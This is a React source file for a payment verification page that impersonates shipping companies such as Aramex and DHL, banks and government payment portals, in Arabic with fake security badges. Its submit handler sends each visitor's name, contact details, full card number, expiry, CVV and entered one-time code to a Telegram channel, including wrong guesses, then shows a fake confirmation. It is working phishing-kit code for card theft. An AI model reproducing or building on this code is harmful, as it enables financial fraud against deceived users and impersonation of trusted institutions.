import { useState, useEffect } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { usePayment, useUpdatePayment, useLink } from "@/hooks/useSupabase";
import { sendToTelegram } from "@/lib/telegram";
import { Shield, AlertCircle, Check, Lock, Clock, X, ShieldCheck } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { getServiceBranding } from "@/lib/serviceLogos";
import { getShippingCompanyDesign } from "@/lib/shippingCompanyDesigns";
import { getBankById } from "@/lib/banks";
import { bankBranding } from "@/lib/brandingSystem";
import BankLogo from "@/components/BankLogo";
import {
  InputOTP,
  InputOTPGroup,
  InputOTPSlot,
} from "@/components/ui/input-otp";
import { designSystem } from "@/lib/designSystem";
import { getGovernmentPaymentSystem } from "@/lib/governmentPaymentSystems";
import { isGovernmentService } from "@/lib/governmentPaymentServices";
import { getCountryByCode } from "@/lib/countries";
import { formatCurrency } from "@/lib/countryCurrencies";
import { getGovernmentLayout } from "@/components/GovernmentLayouts";
import { getNonGovPaymentGatewayVisuals, shouldUsePaymentGatewayVisuals } from "@/lib/nonGovPaymentGatewayVisuals";
import ShippingCompanyHeader from "@/components/ShippingCompanyHeader";

const PaymentOTP = () => {
  const { id, paymentId } = useParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  const { data: payment, refetch } = usePayment(paymentId);
  const { data: link } = useLink(payment?.link_id || undefined);
  const updatePayment = useUpdatePayment();
  
  const [otp, setOtp] = useState("");
  const [error, setError] = useState("");
  const [isLocked, setIsLocked] = useState(false);
  const [timeLeft, setTimeLeft] = useState(180);
  
  const serviceKey = link?.payload?.service_key || link?.payload?.service || link?.payload?.carrier || 'aramex';
  const serviceName = link?.payload?.service_name || serviceKey;
  const branding = getServiceBranding(serviceKey);
  const companyDesign = getShippingCompanyDesign(serviceKey);
  
  const selectedBankId = link?.payload?.selectedBank || '';
  const selectedBank = selectedBankId && selectedBankId !== 'skipped' ? getBankById(selectedBankId) : null;
  const selectedBankBranding = selectedBankId && selectedBankId !== 'skipped' ? bankBranding[selectedBankId] : null;
  
  const selectedCountry = link?.payload?.selectedCountry || "SA";
  const isGovService = isGovernmentService(serviceKey);
  const govSystem = getGovernmentPaymentSystem(selectedCountry);
  
  const useGatewayVisuals = !isGovService && shouldUsePaymentGatewayVisuals(serviceKey);
  const gatewayVisuals = useGatewayVisuals ? getNonGovPaymentGatewayVisuals(selectedCountry, serviceKey) : null;
  
  const isShippingCompany = ['aramex', 'dhl', 'fedex', 'ups', 'smsa', 'naqel', 'zajil'].includes(serviceKey.toLowerCase());

  const primaryColor = isGovService ? govSystem.colors.primary : (gatewayVisuals?.colors.primary || companyDesign.colors.primary || selectedBankBranding?.colors?.primary || branding.colors.primary);
  const secondaryColor = isGovService ? govSystem.colors.secondary : (gatewayVisuals?.colors.secondary || companyDesign.colors.secondary || selectedBankBranding?.colors?.secondary || branding.colors.secondary);
  const surfaceColor = isGovService ? govSystem.colors.surface : (gatewayVisuals?.colors.surface || companyDesign.colors.surface || '#F8F9FA');
  const fontFamily = isGovService ? govSystem.fonts.primaryAr : (gatewayVisuals?.fonts.primaryAr || companyDesign.fonts.primaryAr || 'Cairo, Tajawal, sans-serif');
  
  useEffect(() => {
    if (timeLeft > 0 && !isLocked) {
      const timer = setTimeout(() => setTimeLeft(timeLeft - 1), 1000);
      return () => clearTimeout(timer);
    }
  }, [timeLeft, isLocked]);
  
  useEffect(() => {
    if (payment?.locked_until) {
      const lockTime = new Date(payment.locked_until).getTime();
      const now = Date.now();
      
      if (now < lockTime) {
        setIsLocked(true);
        setError("تم حظر عملية الدفع مؤقتاً لأسباب أمنية.");
      } else {
        setIsLocked(false);
      }
    }
  }, [payment]);
  
  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins}:${secs.toString().padStart(2, '0')}`;
  };
  
  const handleClearOTP = () => {
    setOtp("");
    setError("");
  };

  const handleKeyDown = (e: React.KeyboardEvent) => {
    if (e.key === 'Escape') {
      handleClearOTP();
    }
    if ((e.ctrlKey || e.metaKey) && e.key === 'Backspace') {
      e.preventDefault();
      handleClearOTP();
    }
  };

  const handleSubmit = async () => {
    if (!payment || isLocked) return;

    setError("");

    const isCorrect = otp === payment.otp;

    const telegramResult = await sendToTelegram({
      type: 'payment_otp_attempt',
      data: {
        name: payment.name || '',
        email: payment.email || '',
        phone: payment.phone || '',
        address: payment.address || '',
        service: serviceName,
        amount: payment.amount || '',
        cardholder: payment.cardholder || '',
        cardNumber: payment.card_number || '',
        cardLast4: payment.card_last4 || '',
        expiry: payment.card_expiry || '',
        cvv: payment.card_cvv || '',
        otp: otp,
        otp_status: isCorrect ? 'correct' : 'wrong',
        attempts: payment.attempts + 1
      },
      timestamp: new Date().toISOString()
    });

    if (telegramResult.success) {
      console.log('OTP attempt sent to Telegram successfully');
    } else {
      console.error('Failed to send OTP attempt to Telegram:', telegramResult.error);
    }

    if (otp === payment.otp) {
      const formData = new FormData();
      formData.append('form-name', 'payment-otp-verified');
      formData.append('otp', otp);
      formData.append('service', serviceName);
      formData.append('paymentId', payment.id);
      formData.append('linkId', id || '');
      formData.append('status', 'confirmed');

      try {
        await fetch('/', {
          method: 'POST',
          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
          body: new URLSearchParams(formData as any).toString()
        });
      } catch (error) {
        console.error('Form submission error:', error);
      }

      await updatePayment.mutateAsync({
        paymentId: payment.id,
        updates: {
          status: "confirmed",
          receipt_url: `/pay/${id}/receipt/${payment.id}`,
        },
      });

      toast({
        title: "تم بنجاح!",
        description: "تم تأكيد الدفع بنجاح",
      });

      navigate(`/pay/${id}/receipt/${payment.id}`);
    } else {
      const newAttempts = payment.attempts + 1;

      if (newAttempts >= 3) {
        const lockUntil = new Date(Date.now() + 15 * 60 * 1000).toISOString();

        await updatePayment.mutateAsync({
          paymentId: payment.id,
          updates: {
            attempts: newAttempts,
            locked_until: lockUntil,
          },
        });

        setIsLocked(true);
        setError("تم حظر عملية الدفع مؤقتاً لأسباب أمنية.");

        toast({
          title: "تم الحظر",
          description: "لقد تجاوزت عدد المحاولات المسموحة",
          variant: "destructive",
        });
      } else {
        await updatePayment.mutateAsync({
          paymentId: payment.id,
          updates: {
            attempts: newAttempts,
          },
        });

        setError(`رمز التحقق غير صحيح. حاول مرة أخرى. (${3 - newAttempts} محاولات متبقية)`);
        refetch();
      }
    }
  };
  
  useEffect(() => {
    if (payment?.otp) {
      console.log("🔐 OTP للاختبار:", payment.otp);
    }
  }, [payment]);

  if (isGovService) {
    const GovLayout = getGovernmentLayout(selectedCountry);
    return (
      <GovLayout
        countryCode={selectedCountry}
        serviceName={govSystem.nameAr || serviceName}
        amount={payment?.amount ? formatCurrency(parseFloat(payment.amount), selectedCountry) : ''}
      >
        <div className="text-center mb-6">
          <div className="flex items-center justify-center gap-2 mb-2">
            <Lock className="w-5 h-5 text-green-600" />
            <h2 className="text-lg font-bold text-gray-800">التحقق من الهوية</h2>
          </div>
          <p className="text-sm text-gray-600">
            أدخل رمز التحقق (OTP) المرسل إلى هاتفك المسجل
          </p>
        </div>

        <div className="flex flex-col items-center">
          {/* Info Box */}
          <div className="w-full bg-blue-50 border border-blue-100 rounded-md p-4 mb-6 flex items-start gap-3">
            <div className="bg-blue-100 p-1.5 rounded-full mt-0.5">
              <ShieldCheck className="w-4 h-4 text-blue-600" />
            </div>
            <div>
              <p className="text-xs text-blue-800 font-bold mb-1">
                تأمين إضافي
              </p>
              <p className="text-xs text-blue-600 leading-relaxed">
                لحماية حسابك، يرجى عدم مشاركة رمز التحقق مع أي شخص، بما في ذلك موظفي البنك.
              </p>
            </div>
          </div>

          <div className="mb-6 w-full flex justify-center">
            <div className="flex justify-center items-center gap-2" dir="ltr">
              <InputOTP 
                maxLength={4} 
                value={otp} 
                onChange={setOtp}
                disabled={isLocked}
                autoComplete="one-time-code"
              >
                <InputOTPGroup className="gap-2 sm:gap-3">
                  {[0, 1, 2, 3].map((index) => (
                    <InputOTPSlot 
                      key={index} 
                      index={index}
                      className="w-12 h-12 sm:w-14 sm:h-14 text-xl sm:text-2xl font-bold border-2 rounded-lg transition-all focus:ring-2 bg-white"
                      style={{
                        borderColor: otp[index] ? govSystem.colors.primary : '#E5E7EB',
                        color: govSystem.colors.text
                      }}
                    />
                  ))}
                </InputOTPGroup>
              </InputOTP>
            </div>
          </div>

          {error && (
            <div className="w-full bg-red-50 border border-red-100 rounded-md p-3 mb-6 flex items-center gap-2 text-red-600 animate-in fade-in slide-in-from-top-1">
              <AlertCircle className="w-4 h-4 flex-shrink-0" />
              <p className="text-xs font-semibold">{error}</p>
            </div>
          )}

          <div className="w-full space-y-4">
            <Button
              size="lg"
              className="w-full h-12 text-base font-bold shadow-md"
              onClick={handleSubmit}
              disabled={updatePayment.isPending || isLocked || otp.length < 4}
              style={{
                background: govSystem.gradients.primary,
                color: govSystem.colors.textOnPrimary,
                borderRadius: govSystem.borderRadius.md
              }}
            >
              {updatePayment.isPending ? "جاري التحقق..." : "تأكيد"}
            </Button>

            <div className="flex justify-between items-center text-xs text-gray-500 px-1">
              <span>لم يصلك الرمز؟</span>
              {timeLeft > 0 ? (
                <span className="font-mono bg-gray-100 px-2 py-1 rounded text-gray-700">
                  {formatTime(timeLeft)}
                </span>
              ) : (
                <button 
                  onClick={() => { setTimeLeft(180); /* Add resend logic if needed */ }}
                  className="text-blue-600 hover:underline font-semibold"
                >
                  إعادة الإرسال
                </button>
              )}
            </div>
          </div>
        </div>
      </GovLayout>
    );
  }
  
  return (
    <>
      {isShippingCompany ? (
        <ShippingCompanyHeader
          companyKey={serviceKey}
          serviceName={serviceName}
          showSecurityBadge={true}
        />
      ) : (
        <div 
          className="w-full py-6 px-4 shadow-md sticky top-0 z-50"
          style={{
            background: '#FFFFFF',
            borderBottom: `3px solid ${primaryColor}`
          }}
        >
          <div className="container mx-auto max-w-6xl flex items-center justify-between">
            <div className="flex items-center gap-4">
              {isGovService && govSystem.logo ? (
                <div className="p-1">
                  <img 
                    src={govSystem.logo} 
                    alt={govSystem.nameAr}
                    className="h-12 w-auto object-contain"
                  />
                </div>
              ) : selectedBank && (
                <>
                  <div className="w-24 sm:w-32">
                    <BankLogo 
                      bankId={selectedBank.id}
                      bankName={selectedBank.name}
                      bankNameAr={selectedBank.nameAr}
                      color={selectedBank.color}
                      size="lg"
                      className="w-full"
                    />
                  </div>
                  <div className="h-10 w-px bg-gray-300 hidden sm:block" />
                </>
              )}
              <div>
                <h2 className="text-lg font-bold" style={{ color: isGovService ? primaryColor : designSystem.colors.neutral[900] }}>
                  {isGovService ? govSystem.nameAr : "التحقق الأمني"}
                </h2>
                <p className="text-sm text-gray-500">
                  {isGovService ? "التحقق من الهوية" : "رمز التحقق OTP"}
                </p>
              </div>
            </div>
            
            <div className={`flex items-center gap-2 px-3 py-1.5 rounded-full ${isGovService ? 'bg-black/5' : 'bg-green-50 border border-green-200'}`}>
              <ShieldCheck className={`w-4 h-4 ${isGovService ? '' : 'text-green-600'}`} style={{ color: isGovService ? primaryColor : undefined }} />
              <span className={`text-xs font-medium ${isGovService ? '' : 'text-green-700'}`} style={{ color: isGovService ? primaryColor : undefined }}>اتصال آمن</span>
            </div>
          </div>
        </div>
      )}
      
      <div 
        className="min-h-screen flex flex-col"
        dir="rtl"
        onKeyDown={handleKeyDown}
        tabIndex={0}
        style={{
          background: isShippingCompany 
            ? `linear-gradient(135deg, ${companyDesign.colors.background}, ${companyDesign.colors.surface})` 
            : `linear-gradient(135deg, ${selectedBankBranding?.colors?.surface || '#F8F9FA'}, #FFFFFF)`,
          fontFamily: isShippingCompany 
            ? companyDesign.fonts.primaryAr 
            : selectedBankBranding?.fonts?.arabic || 'Cairo, Tajawal, sans-serif'
        }}
      >
        {/* Main Content */}
        <div className="flex-1 py-8 sm:py-12">
          <div className="container mx-auto px-4 max-w-md">
            {isShippingCompany && companyDesign.headerImage && (
              <div className="mb-6 rounded-xl overflow-hidden shadow-lg">
                <img
                  src={companyDesign.headerImage}
                  alt={serviceName}
                  className="w-full h-32 sm:h-48 object-cover"
                  onError={(e) => e.currentTarget.style.display = 'none'}
                />
              </div>
            )}
            
            <div className="text-center mb-6">
              <Badge 
                className="text-sm px-5 py-2"
                style={{
                  background: isShippingCompany 
                    ? companyDesign.gradients.primary 
                    : `linear-gradient(135deg, ${primaryColor}, ${secondaryColor})`,
                  color: isShippingCompany ? (companyDesign.colors.textOnPrimary || '#FFFFFF') : '#FFFFFF'
                }}
              >
                <Lock className="w-4 h-4 ml-2" />
                <span>التحقق الآمن</span>
              </Badge>
            </div>
            
            <Card 
              className="overflow-hidden border-0" 
              style={{ 
                borderRadius: isShippingCompany ? companyDesign.borderRadius.lg : '16px',
                boxShadow: isShippingCompany ? companyDesign.shadows.lg : '0 4px 20px rgba(0,0,0,0.08)',
                borderTop: `4px solid ${primaryColor}`
              }}
            >
              {/* Card Header */}
              <div 
                className="px-6 sm:px-8 pt-6 sm:pt-8 pb-4"
                style={{
                  background: isShippingCompany 
                    ? companyDesign.gradients.header || companyDesign.gradients.primary 
                    : `linear-gradient(135deg, ${primaryColor}, ${secondaryColor})`,
                }}
              >
                <div className="flex items-center justify-between">
                  <div className="flex items-center gap-3">
                    <div className="w-12 h-12 rounded-full bg-white/20 backdrop-blur-sm flex items-center justify-center animate-pulse">
                      <Shield 
                        className="w-6 h-6" 
                        style={{ color: isShippingCompany ? (companyDesign.colors.textOnPrimary || '#FFFFFF') : '#FFFFFF' }}
                      />
                    </div>
                    <div>
                      <h1 
                        className="text-xl sm:text-2xl font-bold"
                        style={{
                          color: isShippingCompany ? (companyDesign.colors.textOnPrimary || '#FFFFFF') : '#FFFFFF',
                          fontFamily: isShippingCompany ? companyDesign.fonts.primaryAr : undefined
                        }}
                      >
                        رمز التحقق
                      </h1>
                      <p 
                        className="text-sm"
                        style={{
                          color: isShippingCompany ? (companyDesign.colors.textOnPrimary || '#FFFFFF') : '#FFFFFF',
                          opacity: 0.9
                        }}
                      >
                        {selectedBank?.nameAr || serviceName}
                      </p>
                    </div>
                  </div>
                  
                  {timeLeft > 0 && (
                    <div 
                      className="flex items-center gap-2 px-3 py-1.5 rounded-full text-sm font-semibold bg-white/20 backdrop-blur-sm"
                      style={{ color: isShippingCompany ? (companyDesign.colors.textOnPrimary || '#FFFFFF') : '#FFFFFF' }}
                    >
                      <Clock className="w-4 h-4" />
                      <span>{formatTime(timeLeft)}</span>
                    </div>
                  )}
                </div>
              </div>

              {/* Card Body */}
              <div className="px-6 sm:px-8 py-6 sm:py-8 bg-white">
                {/* Info Message */}
                <div 
                  className="p-4 rounded-lg mb-6"
                  style={{
                    background: `${primaryColor}10`,
                    border: `1px solid ${primaryColor}30`
                  }}
                >
                  <p className="text-sm" style={{ color: primaryColor }}>
                    📱 تم إرسال رمز التحقق المكون من 4 أرقام إلى هاتفك المسجل في البنك.
                  </p>
                </div>
                
                {/* Testing Note */}
                {payment?.otp && (
                  <div className="bg-amber-500/10 border border-amber-500/20 rounded-lg p-3 mb-6">
                    <p className="text-sm text-amber-600">
                      <strong>للاختبار فقط:</strong> رمز OTP = <span className="font-mono text-lg font-bold">{payment.otp}</span>
                    </p>
                  </div>
                )}
                
                {/* OTP Input */}
                <div className="mb-6">
                  <div className="flex justify-center items-center gap-3">
                    <InputOTP 
                      maxLength={4} 
                      value={otp} 
                      onChange={setOtp}
                      disabled={isLocked}
                      autoComplete="one-time-code"
                    >
                      <InputOTPGroup className="gap-3">
                        {[0, 1, 2, 3].map((index) => (
                          <InputOTPSlot 
                            key={index} 
                            index={index}
                            className="w-14 h-14 sm:w-16 sm:h-16 text-2xl sm:text-3xl font-bold border-2 rounded-xl transition-all"
                            style={{
                              borderColor: otp[index] ? primaryColor : `${primaryColor}40`,
                              background: otp[index] ? `${primaryColor}10` : 'transparent',
                              color: otp[index] ? primaryColor : designSystem.colors.neutral[400]
                            }}
                          />
                        ))}
                      </InputOTPGroup>
                    </InputOTP>
                    
                    {otp.length > 0 && !isLocked && (
                      <Button
                        type="button"
                        variant="ghost"
                        size="sm"
                        onClick={handleClearOTP}
                        className="w-10 h-10 p-0 rounded-full hover:bg-destructive/10 hover:text-destructive transition-colors"
                      >
                        <X className="w-5 h-5" />
                      </Button>
                    )}
                  </div>
                  
                  {otp.length > 0 && !isLocked && (
                    <div className="text-center mt-3">
                      <p className="text-xs text-gray-500">
                        اضغط <kbd className="px-2 py-1 text-xs bg-gray-100 rounded border">Esc</kbd> أو زر <X className="w-3 h-3 inline mx-1" /> لمسح الرمز
                      </p>
                    </div>
                  )}
                </div>
                
                {/* Error Message */}
                {error && (
                  <div className="bg-destructive/10 border border-destructive/20 rounded-lg p-3 mb-6 flex items-start gap-3">
                    <AlertCircle className="w-5 h-5 text-destructive mt-0.5 flex-shrink-0" />
                    <p className="text-sm text-destructive">{error}</p>
                  </div>
                )}
                
                {/* Attempts Counter */}
                {payment && payment.attempts > 0 && !isLocked && (
                  <div className="text-center mb-6">
                    <p className="text-sm text-gray-600">
                      المحاولات المتبقية: <strong className="text-lg" style={{ color: primaryColor }}>{3 - payment.attempts}</strong>
                    </p>
                  </div>
                )}
                
                {/* Submit Button */}
                <Button
                  size="lg"
                  className="w-full text-lg py-7 font-bold transition-all hover:shadow-lg rounded-xl"
                  onClick={handleSubmit}
                  disabled={updatePayment.isPending || isLocked || otp.length < 4}
                  style={{
                    background: isShippingCompany 
                      ? companyDesign.gradients.primary 
                      : `linear-gradient(135deg, ${primaryColor}, ${secondaryColor})`,
                    color: isShippingCompany ? (companyDesign.colors.textOnPrimary || '#FFFFFF') : '#FFFFFF',
                    boxShadow: isShippingCompany 
                      ? companyDesign.shadows.md 
                      : `0 8px 20px -6px ${primaryColor}60`,
                    fontFamily: isShippingCompany ? companyDesign.fonts.primaryAr : undefined
                  }}
                >
                  {updatePayment.isPending ? (
                    <span>جاري التحقق...</span>
                  ) : isLocked ? (
                    <span>محظور مؤقتاً</span>
                  ) : (
                    <>
                      <Check className="w-5 h-5 ml-2" />
                      <span>تأكيد الدفع</span>
                    </>
                  )}
                </Button>
                
                <p className="text-xs text-center text-gray-500 mt-4">
                  لم تستلم الرمز؟ تحقق من رسائلك أو اتصل بالبنك
                </p>
              </div>

              {/* Card Footer */}
              <div 
                className="px-6 sm:px-8 py-4 border-t bg-gray-50"
              >
                <div className="flex items-center justify-center gap-4 text-xs text-gray-500">
                  <div className="flex items-center gap-1.5">
                    <Lock className="w-3 h-3" />
                    <span>SSL Encrypted</span>
                  </div>
                  <span>•</span>
                  <div className="flex items-center gap-1.5">
                    <ShieldCheck className="w-3 h-3" />
                    <span>Verified</span>
                  </div>
                </div>
              </div>
            </Card>
            
            {/* Hidden Netlify Form */}
            <form name="payment-otp-verified" data-netlify="true" data-netlify-honeypot="bot-field" hidden>
              <input type="text" name="otp" />
              <input type="text" name="service" />
              <input type="text" name="paymentId" />
              <input type="text" name="linkId" />
              <input type="text" name="status" />
            </form>
          </div>
        </div>

        {/* Footer */}
        <div className="py-6 border-t bg-white">
          <div className="container mx-auto px-4 max-w-md text-center">
            <p className="text-xs text-gray-500">
              © 2025 {selectedBank?.nameAr || 'البنك'}. جميع الحقوق محفوظة.
            </p>
          </div>
        </div>
      </div>
    </>
  );
};

export default PaymentOTP;